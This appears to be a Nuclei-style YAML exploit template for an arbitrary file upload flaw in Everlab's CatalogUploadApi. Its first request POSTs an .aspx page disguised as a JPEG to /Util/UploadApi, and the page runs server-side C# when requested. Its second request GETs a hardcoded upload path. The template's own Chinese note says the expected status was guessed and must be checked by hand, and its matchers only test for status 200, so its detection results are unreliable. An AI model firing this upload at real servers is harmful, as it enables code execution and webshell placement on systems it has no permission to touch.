id: poc-1b408d6e19cc469db66a
info:
  name: Everlab-CatalogUploadApi存在文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /Util/UploadApi HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0

    Content-Length: 345

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Connection: close

    Content-Type: multipart/form-data; boundary=---------------------------7153094104923513110228090822

    Origin: null

    Upgrade-Insecure-Requests: 1

    Connection: close


    -----------------------------7153094104923513110228090822

    Content-Disposition: form-data; name="Filedata"; filename="ckviaxtcmw.aspx"

    Content-Type: image/jpeg


    <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>

    -----------------------------7153094104923513110228090822--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /upload/2023/12/25/bef4dd40-de3b-4139-837a-784f534a1e00.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0

    Connection: close

    Accept-Encoding: gzip, deflate'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
